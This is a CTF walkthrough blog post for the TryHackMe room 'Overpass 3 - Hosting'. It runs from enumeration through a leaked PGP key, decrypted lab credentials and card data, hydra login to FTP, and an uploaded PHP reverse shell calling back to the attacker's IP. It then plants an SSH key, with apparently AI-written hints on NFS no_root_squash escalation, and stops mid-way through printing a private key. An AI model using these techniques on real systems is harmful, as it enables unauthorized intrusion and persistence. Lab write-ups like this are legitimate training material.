---
layout: post
title: "Overpass 3 - Hosting"
date: "2026-10-04"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - TryHackMe
---

# Overpass 3 - Hosting
You know them, you love them, your favourite group of broke computer science students have another business venture! Show them that they probably should hire someone for security...

After Overpass's rocky start in infosec, and the commercial failure of their password manager and subsequent hack, they've decided to try a new business venture.

Overpass has become a web hosting company!
Unfortunately, they haven't learned from their past mistakes. Rumour has it, their main web server is extremely vulnerable.

Target IP Address: 10.48.148.30

Kali Linux: 192.168.162.207

```
┌──(root㉿kali)-[~]
└─# nmap -sV -O 10.48.148.30
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-04 05:07 -0400
Nmap scan report for 10.48.148.30
Host is up (0.038s latency).
Not shown: 987 filtered tcp ports (no-response), 10 filtered tcp ports (admin-prohibited)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.37 ((centos))
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.19 (91%), Linux 5.14 - 6.8 (91%), Linux 3.10 - 3.13 (90%), Linux 4.15 (90%), Crestron XPanel control system (86%), Linux 3.8 - 3.16 (86%), Amazon Linux AMI 2018.03 (Linux 4.14) (85%), Android 10 - 12 (Linux 4.14 - 4.19) (85%), HP P2000 G3 NAS device (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Unix

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.10 seconds
```

http://10.48.148.30/


Overpass offer a range of web and email hosting solutions

Below are the five potential username:

```
Paradox
Elf
MuirlandOracle
NinjaJc01
```

![overpass_hosting.png](/img/in-post/tryhackme/overpass_hosting.png)

Start from web directory enumeration

```
┌──(root㉿kali)-[~]
└─# gobuster dir -u http://10.48.148.30/ -w /usr/share/wordlists/dirb/big.txt 
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.48.148.30/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htaccess            (Status: 403) [Size: 218]
.htpasswd            (Status: 403) [Size: 218]
backups              (Status: 301) [Size: 236] [--> http://10.48.148.30/backups/]
cgi-bin/             (Status: 403) [Size: 217]
Progress: 20469 / 20469 (100.00%)
===============================================================
Finished
===============================================================
```

Access `http://10.48.148.30/backups/`, and download `backup.zip`

There are two files under the zip:

`priv.key`

```
-----BEGIN PGP PRIVATE KEY BLOCK-----

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
=mr8q
-----END PGP PRIVATE KEY BLOCK-----

```

`CustomerDetails.xlsx.gpg` is encrypted


To decrypt a `.gpg` file using a PGP key, first import your private key into GPG's keyring and then run the decryption command. GPG automatically detects and matches the correct private key from your keyring when you decrypt a file.

Import your PGP private key

```
┌──(root㉿kali)-[/home/kali/Downloads/backup]
└─# gpg --list-secret-keys 
gpg: directory '/root/.gnupg' created
gpg: keybox '/root/.gnupg/pubring.kbx' created
gpg: /root/.gnupg/trustdb.gpg: trustdb created
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Downloads/backup]
└─# gpg --list-secret-keys
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Downloads/backup]
└─# gpg --import priv.key 
gpg: key C9AE71AB3180BC08: public key "Paradox <paradox@overpass.thm>" imported
gpg: key C9AE71AB3180BC08: secret key imported
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Downloads/backup]
└─# gpg --list-secret-keys
/root/.gnupg/pubring.kbx
------------------------
sec   rsa2048 2020-11-08 [SC] [expired: 2022-11-08]
      49829BBEB100BB2692F33CD2C9AE71AB3180BC08
uid           [ expired] Paradox <paradox@overpass.thm>

```

Decrypt the File

```
┌──(root㉿kali)-[/home/kali/Downloads/backup]
└─# gpg --output CustomerDetails.xlsx --decrypt CustomerDetails.xlsx.gpg 
gpg: encrypted with rsa2048 key, ID 9E86A1C63FB96335, created 2020-11-08
      "Paradox <paradox@overpass.thm>"
gpg: Note: secret key 9E86A1C63FB96335 expired at Tue 08 Nov 2022 04:14:31 PM EST
```

After decrpted the gpg file, check the `CustomerDetails.xlsx` content with `libreoffice`.

We get users' passwords and credit card information.

```
Customer Name	Username	Password	Credit card number	CVC
Par. A. Doxx	paradox	ShibesAreGreat123	4111 1111 4555 1142	432
0day Montgomery	0day	OllieIsTheBestDog	5555 3412 4444 1115	642
Muir Land	muirlandoracle	A11D0gsAreAw3s0me	5103 2219 1119 9245	737
```

![customerdetails.png](/img/in-post/tryhackme/customerdetails.png)

Try to brute force the ssh and ftp using the above usernames and passwords:

`users.txt`

```
paradox
0day
muirlandoracle
```

`passwds.txt`

```
ShibesAreGreat123
OllieIsTheBestDog
A11D0gsAreAw3s0me
```

target ssh does not support password authentication, however, the password of `paradox` works on the `ftp` server.

```
┌──(root㉿kali)-[/home/kali/Downloads]
└─# hydra -L users.txt -P passwds.txt ftp://10.48.148.30
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-04 06:27:17
[DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:3/p:3), ~1 try per task
[DATA] attacking ftp://10.48.148.30:21/
[21][ftp] host: 10.48.148.30   login: paradox   password: ShibesAreGreat123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-04 06:27:21
```

```
[21][ftp] host: 10.48.148.30   login: paradox   password: ShibesAreGreat123
```

Login with ftp

```
┌──(root㉿kali)-[/home/kali/Downloads]
└─# ftp 10.48.148.30
Connected to 10.48.148.30.
220 (vsFTPd 3.0.3)
Name (10.48.148.30:kali): paradox
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> pwd
Remote directory: /
ftp> ls
229 Entering Extended Passive Mode (|||16797|)
150 Here comes the directory listing.
drwxr-xr-x    2 48       48             24 Nov 08  2020 backups
-rw-r--r--    1 0        0           65591 Nov 17  2020 hallway.jpg
-rw-r--r--    1 0        0            1770 Nov 17  2020 index.html
-rw-r--r--    1 0        0             576 Nov 17  2020 main.css
-rw-r--r--    1 0        0            2511 Nov 17  2020 overpass.svg
226 Directory send OK.
ftp> ls backups
229 Entering Extended Passive Mode (|||42900|)
150 Here comes the directory listing.
-rw-r--r--    1 48       48          13353 Nov 08  2020 backup.zip
226 Directory send OK.
```

We can upload a webshell on the web server `http://10.48.148.30/`, and execute it.

```
┌──(root㉿kali)-[/home/kali/Downloads]
└─# cp /usr/share/webshells/php/php-reverse-shell.php php-reverse-shell.php
```

Change the IP to your kali Linux IP and port to your listening port in `php-reverse-shell.php`

```
$ip = '192.168.162.207';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
```

Start a nc listener on Kali

```
┌──(root㉿kali)-[/home/kali/Downloads]
└─# nc -lvp 1234
listening on [any] 1234 ...

```

The prvious lab timed out, start a new lab.

Target IP Address: 10.48.158.61

Kali Linux: 192.168.162.207

Upload the `php-reverse-shell.php` via ftp

We cannot upload `php-reverse-shell.php` to the `/backups/`, but we can upload it to `/`

```
┌──(root㉿kali)-[~]
└─# ftp 10.48.158.61
Connected to 10.48.158.61.
220 (vsFTPd 3.0.3)
Name (10.48.158.61:kali): paradox
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> pwd
Remote directory: /
ftp> ls
229 Entering Extended Passive Mode (|||47469|)
150 Here comes the directory listing.
drwxr-xr-x    2 48       48             24 Nov 08  2020 backups
-rw-r--r--    1 0        0           65591 Nov 17  2020 hallway.jpg
-rw-r--r--    1 0        0            1770 Nov 17  2020 index.html
-rw-r--r--    1 0        0             576 Nov 17  2020 main.css
-rw-r--r--    1 0        0            2511 Nov 17  2020 overpass.svg
226 Directory send OK.
ftp> put /home/kali/Downloads/php-reverse-shell.php php-reverse-shell.php
local: /home/kali/Downloads/php-reverse-shell.php remote: php-reverse-shell.php
229 Entering Extended Passive Mode (|||30602|)
150 Ok to send data.
100% |****************************************************************************************************************|  5497       10.29 MiB/s    00:00 ETA
226 Transfer complete.
5497 bytes sent in 00:00 (68.86 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||53725|)
150 Here comes the directory listing.
drwxr-xr-x    2 48       48             24 Nov 08  2020 backups
-rw-r--r--    1 0        0           65591 Nov 17  2020 hallway.jpg
-rw-r--r--    1 0        0            1770 Nov 17  2020 index.html
-rw-r--r--    1 0        0             576 Nov 17  2020 main.css
-rw-r--r--    1 0        0            2511 Nov 17  2020 overpass.svg
-rw-r--r--    1 1001     1001         5497 Oct 04 11:14 php-reverse-shell.php
226 Directory send OK.
ftp> 
```

Access the php reverse shell we upload, and we get a shell of apache user!

```
http://10.48.158.61/php-reverse-shell.php
```

```
┌──(root㉿kali)-[/home/kali/Downloads]
└─# nc -lvp 1234
listening on [any] 1234 ...
10.48.158.61: inverse host lookup failed: Unknown host
connect to [192.168.162.207] from (UNKNOWN) [10.48.158.61] 49104
Linux ip-10-48-158-61 4.18.0-193.el8.x86_64 #1 SMP Fri May 8 10:59:10 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 12:16:25 up 5 min,  0 users,  load average: 0.03, 0.23, 0.14
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: cannot set terminal process group (888): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4$ whoami
whoami
apache
sh-4.4$ id
id
uid=48(apache) gid=48(apache) groups=48(apache)
```


```
sh-4.4$ cd /home
cd /home
sh-4.4$ ls
ls
james
paradox
sh-4.4$ cd paradox
cd paradox
sh: cd: paradox: Permission denied
sh-4.4$ cd james
cd james
sh: cd: james: Permission denied
```

```
sh-4.4$ su paradox
su paradox
Password: ShibesAreGreat123
/bin/bash -i
bash: cannot set terminal process group (888): Inappropriate ioctl for device
bash: no job control in this shell
[paradox@ip-10-48-158-61 home]$ whoami
whoami
paradox
[paradox@ip-10-48-158-61 home]$ id
id
uid=1001(paradox) gid=1001(paradox) groups=1001(paradox)
```

https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh

Download the LinEnum.sh on the target and run

```
┌──(kali㉿kali)-[~/Downloads]
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.48.158.61 - - [04/Oct/2026 07:35:27] "GET /LinEnum.py HTTP/1.1" 200 -
```

```
[paradox@ip-10-48-158-61 ~]$ curl -O "http://192.168.162.207/LinEnum.py"
curl -O "http://192.168.162.207/LinEnum.py"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 46631  100 46631    0     0   288k      0 --:--:-- --:--:-- --:--:--  288k
```

```
[paradox@ip-10-48-158-61 ~]$ echo $PATH
echo $PATH
/home/paradox/.local/bin:/home/paradox/bin:/usr/local/bin:/usr/bin
```

```
### SERVICES #############################################
[-] Running processes:
rpc          783  0.0  0.5  67120  5348 ?        Ss   12:11   0:00 /usr/bin/rpcbind -w -f
root         989  0.0  1.3  68168 12964 ?        Ss   12:11   0:00 /usr/sbin/rpc.mountd
root        1215  0.0  0.0      0     0 ?        S    12:11   0:00 [nfsd]
root        1216  0.0  0.0      0     0 ?        S    12:11   0:00 [nfsd]
root        1217  0.0  0.0      0     0 ?        S    12:11   0:00 [nfsd]
root        1218  0.0  0.0      0     0 ?        S    12:11   0:00 [nfsd]
root        1219  0.0  0.0      0     0 ?        S    12:11   0:00 [nfsd]
root        1220  0.0  0.0      0     0 ?        S    12:11   0:00 [nfsd]
root        1221  0.0  0.0      0     0 ?        S    12:11   0:00 [nfsd]
root        1222  0.0  0.0      0     0 ?        S    12:11   0:00 [nfsd]
```

在 LinEnum_3.txt 的输出结果中，有几个关键的内部服务和进程异常值得作为下一步提权或横向移动的思考方向：

* **隐蔽的本地守护进程：** 审视 `### SERVICES ###` 下的进程列表，排除系统基础进程与常规对外暴露的 Web/SSH 服务后，重点关注 `rpcbind`、`rpc.mountd` 以及 `nfsd`。思考该网络文件共享服务在 Linux 环境下通常依赖哪个配置文件，以及如何使用命令行枚举它当前在系统内部暴露了哪些目录。
* **权限降级配置审计：** 顺着上述发现的服务，直接去系统的 `/etc/` 目录下检查其对应的核心配置文件。重点观察是否存在将高敏感目录（如 `/` 或 `/home`）共享出去的记录，并仔细审查挂载参数，看是否遗漏了关键的权限降级安全机制（例如针对 root 用户身份的 squash 限制）。
* **内网端口穿透 (Pivoting)：** 如果确认了该服务存在风险配置，结合前期的外部信息收集，回想该端口在外部网络中是否可见。如果该服务被防火墙拦截或仅监听在本地，思考如何利用目前已掌握的 `paradox` 权限（特别是现成的 SSH 会话），通过本地端口转发技术（Local Port Forwarding）将该目标端口映射到你的攻击机上，从而在攻击机本地直接进行挂载利用。

你可以先去定位并读取那个关键的文件共享配置文件，验证配置是否存在缺陷后，再决定是否需要搭建隧道进行下一步操作。

```
[paradox@ip-10-48-158-61 ~]$ cat /etc/exports
cat /etc/exports
/home/james *(rw,fsid=0,sync,no_root_squash,insecure)
```

### 关于 `no_root_squash` 的准确理解

* **并不是所有客户端操作都会变成 root**：如果是客户端上的普通用户（例如 UID 1000）进行操作，服务端依然会把操作记录为对应的普通用户 UID。
* **它的本质是“对 root 身份不进行降权限制”**：
* **默认安全机制（`root_squash`）：** 当远程客户端以 **root 身份（UID 0）** 访问或写入 NFS 共享目录时，服务端为了安全，会强制将这个 root 身份“压缩/降级（Squash）”为低权限用户（通常是 `nobody` 或 `nfsnobody`）。
* **关闭安全机制（`no_root_squash`）：** 服务端信任远程客户端的 root 身份。如果客户端在本地以 root 身份在挂载目录下新建文件或修改权限，服务端会**毫无保留地继承该文件的拥有者为服务端上的 root (UID 0)**。


### 继续深入的思考方向

针对 `/home/james *(rw,fsid=0,sync,no_root_squash,insecure)` 这条配置，你可以从以下两个维度进行推导：

#### 维度一：家目录（Home Directory）的固有属性

共享的不是任意临时目录，而是具体用户 `james` 的主目录。思考以下问题：

1. Linux 系统中，用户的家目录下通常隐藏着哪些控制访问权限或配置的文件？（比如与登录凭证、SSH 认证相关的文件）。
2. 如果你在客户端挂载了这个共享目录，且拥有读写权限，你是否可以直接写入某些受信任的配置文件？

#### 维度二：文件系统与特殊权限机制（SUID）

结合 `no_root_squash` 的特性：

1. 如果你在攻击机上（你自己拥有 root 权限）将该 NFS 目录挂载到本地，你在本地以 root 身份往挂载目录里放一个程序，并赋予它特殊的文件权限位（例如 **SUID**），服务端在同步这个文件时会保留这个权限属性吗？
2. 一旦这个带有 SUID 的程序出现在服务端的 `/home/james` 目录下，当你在服务端（以普通用户 `paradox` 或 `james`）去执行这个程序时，该程序会以谁的权限在服务端运行？

结合你目前的凭据和网络可达性，先尝试在攻击机上把这个目录挂载起来，观察目录内部的内容，再结合上述两个维度选择突破口。

Create a Local Mount Point

```
┌──(root㉿kali)-[/mnt]
└─# mkdir -p /mnt/nfs_share
```

Mount the Remote Share

a firewall on the NFS server is blocking the client's connection.

```                                                                
┌──(root㉿kali)-[/mnt]
└─# mount -t nfs 10.48.158.61:/home/james /mnt/nfs_share

mount.nfs: No route to host for 10.48.158.61:/home/james on /mnt/nfs_share
```

遇到防火墙拦截是渗透测试中非常典型的场景，说明目标机的网络边界配置是相对严格的。

既然你希望自己思考，我为你提供三个递进的“逻辑拼图”，你可以顺着这些线索去连接你目前手里已经掌握的条件：

**拼图一：如何穿透网络隔离？**
既然服务（NFS）在目标本地运行且被防火墙保护，外部无法直接交互，那么想要利用它，就必须在目标机器内部建立一个立足点，并把内部的端口“映射”或“转发”到你自己的机器上。
*思考点：* 在 Linux 环境中，哪种自带的远程管理服务最常被用来建立安全的网络隧道（Local Port Forwarding）？你需要获得什么样的访问权限才能建立这条隧道？

**拼图二：凭据类型的“降维”与“升维”**
你目前拥有 `paradox` 用户的 FTP 密码。目标开启了 SSH，但禁止密码登录（这通常意味着只接受公钥/私钥认证）。
*思考点：* SSH 的公钥认证机制是如何工作的？当服务器验证一个客户端是否有权登录时，它实际上是在检查目标用户家目录下的哪一个特定的隐藏文件？

**拼图三：将条件串联（Connecting the Dots）**
FTP 服务的最核心功能就是文件的上传、下载和目录管理。
*思考点：* 如果你使用 `paradox` 的密码登录进 FTP，你是否能访问该用户的家目录？结合拼图二，如果你能在本地生成一对 SSH 密钥，你是否能通过 FTP 的文件管理能力，将你的公钥放置到目标系统 SSH 服务所信任的位置？

如果这条链路走通，你就能完成从 FTP 访问到 SSH 交互式访问的跨越。一旦拿到了 SSH 会话，再回头看“拼图一”，那个被防火墙保护的 NFS 服务对你来说就再也不是触不可及的了。

```
[paradox@ip-10-48-158-61 ~]$ pwd
pwd
/home/paradox
[paradox@ip-10-48-158-61 ~]$ ls -al
ls -al
total 104
...
drwx------  2 paradox paradox    47 Nov 18  2020 .ssh
```

```
[paradox@ip-10-48-158-61 ~]$ cd .ssh
cd .ssh
[paradox@ip-10-48-158-61 .ssh]$ ls
ls
authorized_keys
id_rsa.pub
```

```
[paradox@ip-10-48-158-61 .ssh]$ cat authorized_keys
cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLb0TvbGxoNQXBsG+4vUSvj1LPrYvFFWyoZhaABevOQtXyc/lg0fDuZf9LrjWF6maGNYi/VmlToFZf5lWTedVxvH8RTo9fgKRkjhQGZWjzJKtcaEq+uOaJyFza2NwuhrQs+fSsrcarutLIjd1jnw2W/goR7eFQfZEhKayiajU3bOo5P6HuDqG0D72H3fUf6KjL6RtfeLTA1DvCTFeAtGvMCwWKQHjbmQr7OK3pLi7LNJiuT+o9Wi4Xg2yhPfMKulHiFqmVMWPkbJW/O+pZMOeLO7fQ7yuFncVi8km3RjFAveB+jON+gtjYYg8oeaEM9kezot2AAN5mgd6Sw4+JBCt1JGG5IqdpgnYPCF54f7TwLUHf10/l+5yizf/IaVQilr8cUCmLSNlf330+I2Q4mfYThrMgbpHQTPhImGOVgLrJhppUNjlw2PlpOdV+lRSOiBGmkRbEccklqeGnK6KaORjXv0t4GGLqT6sD8jHaj9GpwaOcEorqcjwhxybHGQu8NR0= paradox@localhost.localdomain
```

```
[paradox@ip-10-48-158-61 .ssh]$ cat id_rsa.pub
cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLb0TvbGxoNQXBsG+4vUSvj1LPrYvFFWyoZhaABevOQtXyc/lg0fDuZf9LrjWF6maGNYi/VmlToFZf5lWTedVxvH8RTo9fgKRkjhQGZWjzJKtcaEq+uOaJyFza2NwuhrQs+fSsrcarutLIjd1jnw2W/goR7eFQfZEhKayiajU3bOo5P6HuDqG0D72H3fUf6KjL6RtfeLTA1DvCTFeAtGvMCwWKQHjbmQr7OK3pLi7LNJiuT+o9Wi4Xg2yhPfMKulHiFqmVMWPkbJW/O+pZMOeLO7fQ7yuFncVi8km3RjFAveB+jON+gtjYYg8oeaEM9kezot2AAN5mgd6Sw4+JBCt1JGG5IqdpgnYPCF54f7TwLUHf10/l+5yizf/IaVQilr8cUCmLSNlf330+I2Q4mfYThrMgbpHQTPhImGOVgLrJhppUNjlw2PlpOdV+lRSOiBGmkRbEccklqeGnK6KaORjXv0t4GGLqT6sD8jHaj9GpwaOcEorqcjwhxybHGQu8NR0= paradox@localhost.localdomain
```

Since we cannot find the private key `id_rsa`, how about we generate a new ssh rsa key pairs by ourself

Backup the previous ones

```
[paradox@ip-10-48-158-61 .ssh]$ mv id_rsa.pub id_rsa.pub.bak
mv id_rsa.pub id_rsa.pub.bak
```

```
[paradox@ip-10-48-158-61 .ssh]$ ssh-keygen -t rsa          
ssh-keygen -t rsa                                                                                                                                            
Generating public/private rsa key pair.                                                                                                                      
Enter file in which to save the key (/home/paradox/.ssh/id_rsa):                                                                                             
Enter passphrase (empty for no passphrase):                                                                                                                  
Enter same passphrase again:                                                                                                                                 
Your identification has been saved in /home/paradox/.ssh/id_rsa.                                                                                             
Your public key has been saved in /home/paradox/.ssh/id_rsa.pub.                                                                                             
The key fingerprint is:                                                                                                                                      
SHA256:fyHFFx+FSmeiv3NYuHhYPuz+qRGb84ixyJqfgEcE5+k paradox@ip-10-48-158-61                                                                                   
The key's randomart image is:                                                                                                                                
+---[RSA 3072]----+                                                                                                                                          
|    . .       .oo|                                                                                                                                          
|     + .   .o +o.|                                                                                                                                          
|      +    oo=. .|                                                                                                                                          
|     o    ....   |                                                                                                                                          
|      E S ..o.   |                                                                                                                                          
|     o   . .+=.  |                                                                                                                                          
|    . o   o**=   |                                                                                                                                          
|     . + oo=X=.. |
|      oo= o+=*+  |
+----[SHA256]-----+

```

Add the new public key `id_rsa.pub` to the `authorized_keys`

```
[paradox@ip-10-48-158-61 .ssh]$ cat id_rsa.pub >> authorized_keys
cat id_rsa.pub >> authorized_keys
```

Save the new private key `id_rsa` locally on our kali linux

```
[paradox@ip-10-48-158-61 .ssh]$ cat id_rsa
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA1s5u5AjklRb5gq+zTsk7OJrHErd2ELG91436A1CZhdIFmwO0WwcK
ko/k7ZvSymm0EnLUI2gDRqBOntNAm7QCOniFV/JcAjcmE3jNwtNg/NF7ISHshrGsYR45qk
Rv8mHdtfI0vNoD23atQGOxwzin0WxUcWcqZuax+zUS0liH6EogX0PaovAne/SNp8TVBcom
Z+gS+gMc++qrHvinCqx4nNhSwarJ/EiALEVS0/fWCMHkpc7niqpZHI2pV5t2O+KyLxxtxk
6eUZdMUSzJa7JxwZstiDyTVaI1vVwOGXFFGlHRcIeJBti++uX2ZJo+m6ZOVlpodnRUhaLR
mJyfG3nvJrru8inlBwUeY6UAbbsg6qfPwzPZGfp1YRpTrgmmEAvLIXJPjhT8p/KP6t0o14
K67L3w5ggRjMw8lXBvBmYaCnNAJVLLNyfSUWnhE91PMmOkNDy1c06DD3guLDZkCPWREWL/
sjvvXHleZFhteoudOn80KNvLVNRAVnEuVs5mcdRtAAAFkMOd4DPDneAzAAAAB3NzaC1yc2
EAAAGBANbObuQI5JUW+YKvs07JOziaxxK3dhCxvdeN+gNQmYXSBZsDtFsHCpKP5O2b0spp
tBJy1CNoA0agTp7TQJu0Ajp4hVfyXAI3JhN4zcLTYPzReyEh7IaxrGEeOapEb/Jh3bXyNL
zaA9t2rUBjscM4p9FsVHFnKmbmsfs1EtJYh+hKIF9D2qLwJ3v0jafE1QXKJmfoEvoDHPvq
